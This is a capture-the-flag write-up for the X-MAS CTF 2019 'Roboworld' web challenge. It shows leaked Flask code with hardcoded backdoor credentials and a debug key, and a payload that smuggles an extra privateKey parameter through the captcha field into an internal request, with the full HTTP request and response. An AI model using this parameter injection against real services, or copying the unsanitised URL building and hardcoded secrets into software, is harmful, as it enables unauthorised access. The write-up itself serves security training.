<h1>X-MAS CTF 2019 â€“ Roboworld</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 50</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(</p>
  
  <p>Can you figure out what's wrong and access the secret files?</p>
  
  <p>Remote server: http://challs.xmas.htsp.ro:11000</p>
  
  <p>Files: <a href="leak.py">leak.py</a></p>
  
  <p>Author: Reda</p>
</blockquote>

<h2>Solution</h2>

<p>The webpage contains the following HTML code.</p>

<p>```html
<head>
    <script>
        function captchaGenerateVerificationValue()
        {
            //Devnote:
            //Oops I broke the captcha verification function
            //so it will just generate random stuff for the verification value
            //hope no one notices :O</p>

<pre><code>        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        result = ""
        for ( var i = 0; i &lt; 10; i++ ) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }

        document.getElementById("captcha").value = result
    }
&lt;/script&gt;
</code></pre>

<p></head></p>

<p>Login:</p>

<form method="post" action="/login">
    Username: <input type="text" name="user" /><br>
    Password: <input type="password" name="pass" /><br>
    Captcha: <input id="captcha" onchange="captchaGenerateVerificationValue()" type="checkbox" name="captcha_verification_value" value="" /> I am not a robot <br>
    <input type="submit" value="Login" /><br>
</form>

<p>```</p>

<p>So the CAPTCHA checkbox produces random string.</p>

<p>Analyzing the <a href="leak.py">leak.py</a> file you can discover that the following credentials are used to login:
* username: <code>backd00r</code>;
* password: <code>catsrcool</code>.</p>

<p>```python
from flask import Flask, render_template, request, session, redirect
import os
import requests
from captcha import verifyCaptchaValue</p>

<p>app = Flask(<strong>name</strong>)</p>

<p>@app.route('/')
def index():
    return render_template("index.html")</p>

<p>@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('user')
    password = request.form.get('pass')
    captchaToken = request.form.get('captcha<em>verification</em>value')</p>

<pre><code>privKey = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" #redacted
r = requests.get('http://127.0.0.1:{}/captchaVerify?captchaUserValue={}&amp;privateKey={}'.format(str(port), captchaToken, privKey))
#backdoored ;)))
if username == "backd00r" and password == "catsrcool" and r.content == b'allow':
    session['logged'] = True
    return redirect('//redacted//')
else:
    return "login failed"
</code></pre>

<p>@app.route('/captchaVerify')
def captchaVerify():
    #only 127.0.0.1 has access
    if request.remote_addr != "127.0.0.1":
        return "Access denied"</p>

<pre><code>token = request.args.get('captchaUserValue')
privKey = request.args.get('privateKey')
#TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system
if(verifyCaptchaValue(token, privKey)):
    return str("allow")
else:
    return str("deny")
</code></pre>

<p>```</p>

<p>Then you have to beat an HTTP GET service available only on localhost. It consumes the CAPTCHA token and a private key that is redacted in the source code.</p>

<p>A TODO comment claims that there is a debugging private key for used for testing: <code>8EE86735658A9CE426EAF4E26BB0450E</code>. This seems to be the MD5 of the string: <code>fuckingdog</code>.</p>

<p>You can manipulate the link used in the <code>requests.get</code> operation, via CAPTCHA parameter, excluding the existing private key parameter through <code>#</code> and forcing the debugging private key.</p>

<p>The payload is the following.</p>

<p><code>
pwned&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E#
</code></p>

<p>So the following HTTP request can be used.</p>

<p>```
POST /login HTTP/1.1
Host: challs.xmas.htsp.ro:11000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://challs.xmas.htsp.ro:11000
Connection: close
Referer: http://challs.xmas.htsp.ro:11000/
Upgrade-Insecure-Requests: 1</p>

<p>user=backd00r&amp;pass=catsrcool&amp;captcha<em>verification</em>value=pwned%26privateKey%3D8EE86735658A9CE426EAF4E26BB0450E%23</p>

<p>HTTP/1.1 302 FOUND
Server: nginx
Date: Mon, 16 Dec 2019 21:48:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 251
Location: http://challs.xmas.htsp.ro:11000/dashboard_jidcc88574c
Connection: close
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWQiOnRydWV9.Xff7wQ.nX353pLhy-6ES9lB32QOopGmz-Y; HttpOnly; Path=/</p>

<p><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title></p>

<h1>Redirecting...</h1>

<p><p>You should be redirected automatically to target URL: <a href="/dashboard_jidcc88574c">/dashboard_jidcc88574c</a>.  If not click the link.
```</p>

<p>The page where you will be redirect is the following</p>

<p>```html</p>

<h2>Welcome to the secret website where we store secret stuff</h2>

<p><br>
<br>
Secret Stuff:
<br>
<a href="/static/hidden_directory_1337_781/098c533dc5420628a9f51c1911198c4c.jpg">098c533dc5420628a9f51c1911198c4c.jpg</a>
<br>
<a href="/static/hidden_directory_1337_781/2.jpg">2.jpg</a>
<br>
<a href="/wtf.mp4">wtf.mp4</a>
```
It will contain three files:
* <a href="098c533dc5420628a9f51c1911198c4c.jpg">098c533dc5420628a9f51c1911198c4c.jpg</a>;
* <a href="2.jpg">2.jpg</a>;
* <a href="wtf.mp4">wtf.mp4</a>.</p>

<p>Inside the <a href="wtf.mp4">wtf.mp4</a> video there is the flag, reversed in order.</p>

<p><code>
X-MAS{Am_1_Th3_R0bot?_0.o}
</code></p>
